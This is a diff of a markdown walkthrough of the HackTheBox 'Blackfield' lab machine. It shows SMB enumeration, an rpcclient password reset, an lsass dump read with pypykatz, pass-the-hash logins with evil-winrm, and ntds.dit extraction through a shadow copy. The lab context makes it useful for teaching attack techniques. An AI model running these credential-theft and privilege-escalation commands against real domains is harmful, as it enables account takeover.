@@ -20,7 +20,6 @@ nmap -sC -sV -Pn -oA nmap/nmap 10.10.10.192
 
 I put the domain name BLACKFIELD.local into the /etc/hosts file.
 
-
 ### [](#header-3)Smbclient
 I wanted to get some more information about SMB so I used smbclient like this:
 
@@ -33,7 +32,6 @@ smbclient -L BLACKFIELD.local
 I took a look at the share profiles$ and found a huge amount of folder with names that looked like usernames. I saved all names into a file, user.txt.
 
 I show this more in detail in the video.
-
 
 ### [](#header-3)GetNPUsers.py
 
@@ -128,20 +126,15 @@ SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)
 
 If this is the case then maybe I can change password for some other users, according to <a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux">mubix blog-post</a>. So I tried changing the password for the high privileged accounts,until I found that it worked on the audit2020 account:
 
-
-
-
 ```
 set userinfo2 audit2020 23 ‘TestTest123!’
 ```
 
 The password needs to be a bit complex to get this to work. This according to the password policy for the domain.
 
-
 ### [](#header-3)Forensic SMB share
 
 So after a bit of testing different things I took a look at the SMB enumeration from earlier. There is a share called forensic.I logged in and listed the content with the user audit2020.
-
 
 ```
 Smbclient -U audit2020 //10.10.10.192/forensic
@@ -173,7 +166,6 @@ There is one file that look more interesting then the others, lsass.zip, so I un
 
 I used pypykatz to try to get something useful out of it.
 
-
 ```
 Pypykatz lsa minidump lsass.DMP
 ```
@@ -181,8 +173,6 @@ Pypykatz lsa minidump lsass.DMP
 ![](Pictures/Blackfield/lsass1.png)
 
 There is much information, but I only found the hash for the account svc_backup useful. With an NT hash there is a possibility to crack it or to it as pass-the-hash.After alot of testing with different things I found out that svc_backup is a member of the Remote Management Group (found this out using bloodhound)
-
-
 
 ## [](#header-2)Exploitation
 
@@ -197,7 +187,6 @@ evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192
 ![](Pictures/Blackfield/evil1.png)
 
 And I was able to get the user.txt flag.
-
 
 ### [](#header-3)Enumeration svc_backup
 
@@ -224,7 +213,6 @@ Net localgroup administrators
 ```
 
 ![](Pictures/Blackfield/netlocal.png)
-
 
 The account svc_backup is not a member of the administrators group, yet.
 The file GptTmpl.inf looks like this:
@@ -276,7 +264,6 @@ S-1-5-21-4194615774-2175524697-3563712290-1413
 ```
 
 I copied the content of the GptTmpl.inf file to a text editor on my local machine and added the following content in the end:
-
 
 ```
 [Group Membership]
@@ -343,8 +330,6 @@ evil-winrm -u administrator -p '###_ADM1N_3920_###' -i 10.10.10.192
 
 ![](Pictures/Blackfield/evil2.png)
 
-
-
 ## [](#header-2)Alterative solution
 
 Mounting the system drive as shadow copy and extract the ntds.dit and SYSTEM files.Before I wrote this segment I did a reset of the machine to get rid of my administrative privileges.
@@ -358,7 +343,6 @@ vssadmin create shadow /for=C:
 ```
 
 If this doesn’t work there is a simple script made by <a href="http://0xprashant.github.io">0xprashant</a>
-
 
 For some reason you have to put a random char at the end of each line because the last char will be deleted?! In my example I put an “r”.
 
@@ -380,7 +364,6 @@ robocopy.exe "O:\Windows\NTDS" "C:\Windows\Temp" ntds.dit /b
 
 If this for some reason doesn’t work try <a href="https://github.com/giuliano108/SeBackupPrivilege">this</a> method:
 
-
 You also need the SYSTEM file from the Registry hive. You can copythe file with robocopy or just save it from the Registry.
 
 ```
@@ -395,9 +378,7 @@ robocopy.exe "O:\Windows\system32\config" "C:\Windows\Temp" SYSTEM/b
 
 Download the ntds.dit and the SYSTEM file to the local Kali machine.
 
-
 ![](Pictures/Blackfield/evil5.png)
-
 
 ![](Pictures/Blackfield/evil6.png)
 
@@ -416,7 +397,5 @@ evil-winrm -u administrator -H 184fb5e5178480be64824d4cd53b99ee -i10.10.10.192
 ```
 
 ![](Pictures/Blackfield/evil7.png)
-
-
 
 <iframe id="lbry-iframe" width="560" height="315" src="https://lbry.tv/$/embed/HackTheBox---Blackfield/741a30ffb1035f0833ef667a70b295f00e48881e" allowfullscreen></iframe>
